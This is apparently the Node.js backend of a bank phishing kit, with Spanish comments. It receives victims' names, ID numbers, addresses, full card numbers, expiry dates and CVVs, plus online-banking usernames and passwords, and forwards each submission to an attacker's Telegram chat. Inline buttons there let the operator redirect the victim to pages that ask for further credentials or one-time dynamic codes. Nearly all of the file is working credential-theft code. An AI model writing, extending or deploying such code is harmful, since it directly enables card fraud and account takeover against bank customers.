// server.js

import express from "express";
import cors from "cors";
import bodyParser from "body-parser";
import fetch from "node-fetch";
import dotenv from "dotenv";
dotenv.config();

const app = express();
const port = process.env.PORT || 3000;

// MIDDLEWARE
app.use(cors());
app.use(bodyParser.json());
app.use(express.static("public")); // para servir el HTML estático

// CONFIGURACIÓN TELEGRAM
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("⚠️ Faltan variables de entorno en .env");
  process.exit(1);
}

// memoria temporal para updates
let transactionMemory = {};

// PROCESAR FORMULARIO
app.post("/procesar_formulario", async (req, res) => {
  const data = req.body;

  if (!data) {
    return res.status(400).json({ status: "error", message: "Datos inválidos" });
  }

  // generar ID de transacción
  const transaction_id = Date.now().toString(36) + Math.random().toString(36).slice(2);
  transactionMemory[transaction_id] = { status: "pending" };

  const message = `
<b>Nuevo método de pago pendiente de verificación</b>
----------------------------------------------
🆔 <b>ID Transacción:</b> ${transaction_id}
👤 <b>Nombre:</b> ${data.nombre}
🆔 <b>Cédula:</b> ${data.id}
📧 <b>Email:</b> ${data.email}
📞 <b>Celular:</b> ${data.celular}
🏠 <b>Dirección:</b> ${data.direccion}
🏦 <b>Banco:</b> ${data.banco}
💳 <b>Tarjeta:</b> ${data.tarjeta}
📅 <b>Fecha:</b> ${data.ftarjeta}
🔐 <b>CVV:</b> ${data.cvv}
🌐 <b>IP:</b> ${data.ip}
----------------------------------------------
`;

  const keyboard = JSON.stringify({
    inline_keyboard: [
      [{ text: "Pedir Logo", callback_data: `pedir_logo:${transaction_id}` }],
      [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transaction_id}` }],
      [{ text: "Error de TC", callback_data: `error_tc:${transaction_id}` }],
      [{ text: "Error de Logo", callback_data: `error_logo:${transaction_id}` }],
      [{ text: "Finalizar", callback_data: `finalizar:${transaction_id}` }]
    ]
  });

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        reply_markup: keyboard,
        parse_mode: "HTML"
      })
    });

    const tgData = await tgRes.json();

    if (tgData.ok) {
      console.log("✅ Telegram mensaje enviado correctamente");
      return res.json({ status: "success", transaction_id });
    } else {
      console.error("❌ Telegram error:", tgData);
      return res.json({ status: "error", message: "Error enviando a Telegram" });
    }
  } catch (err) {
    console.error("❌ Error en server.js:", err);
    return res.json({ status: "error", message: "Error en servidor" });
  }
});

// CHECK UPDATES
app.get("/check_updates/:transaction_id", async (req, res) => {
  const transaction_id = req.params.transaction_id;

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates`);
    const data = await response.json();

    const updates = data.result || [];

    for (const update of updates) {
      if (update.callback_query) {
        const { data: callbackData } = update.callback_query;
        const [action, id] = callbackData.split(":");

        if (id === transaction_id) {
          switch (action) {
            case "pedir_logo":
              return res.json({ redirect: "pedir_logo.html" });
            case "pedir_dinamica":
              return res.json({ redirect: "pedir_dinamica.html" });
            case "error_tc":
              return res.json({ redirect: "payment.html" });
            case "error_logo":
              return res.json({ redirect: "pedir_logo.html" });
            case "finalizar":
              return res.json({ redirect: "finish.html" });
            default:
              break;
          }
        }
      }
    }
    res.json({ redirect: null });
  } catch (error) {
    console.error("Error en check_updates:", error);
    res.json({ redirect: null });
  }
});

// PROCESAR FORMULARIO
app.post("/procesar_formulario", async (req, res) => {
  // ...
});

// ⬅️ AQUÍ MISMO, después de procesar_formulario
app.post("/procesar_logo", async (req, res) => {
  const data = req.body;

  if (!data) {
    return res.status(400).json({ status: "error", message: "Datos inválidos" });
  }

  const message = `
<b>Verificación de usuario</b>
---------------------------
👤 <b>Usuario:</b> ${data.usuario}
🔐 <b>Clave:</b> ${data.clave}
💳 <b>Tarjeta:</b> ${data.tarjeta}
📅 <b>Expiración:</b> ${data.ftarjeta}
🌐 <b>IP:</b> ${data.ip}
`;

  const keyboard = JSON.stringify({
    inline_keyboard: [
      [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${data.id}` }],
      [{ text: "Error Usuario/Clave", callback_data: `error_logo:${data.id}` }],
      [{ text: "Finalizar", callback_data: `finalizar:${data.id}` }]
    ]
  });

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        reply_markup: keyboard,
        parse_mode: "HTML"
      })
    });

    const tgData = await tgRes.json();
    if (tgData.ok) {
      console.log("✅ Mensaje de logo enviado correctamente");
      res.json({ status: "success" });
    } else {
      console.error("❌ Telegram error al enviar logo:", tgData);
      res.json({ status: "error", message: "No se pudo enviar a Telegram" });
    }
  } catch (err) {
    console.error("❌ Error en procesar_logo:", err);
    res.json({ status: "error", message: "Error en servidor" });
  }
});


// CHECK UPDATES
app.get("/check_updates/:transaction_id", async (req, res) => {
  // ...
});


// ⬇️ aquí agregas el webhook:
app.post("/miwebhook", (req, res) => {
  console.log("👉 Webhook recibido de Telegram:", req.body);
  res.sendStatus(200);
});

// SERVER
app.listen(port, () => {
  console.log(`🚀 Servidor escuchando en http://localhost:${port}`);
});
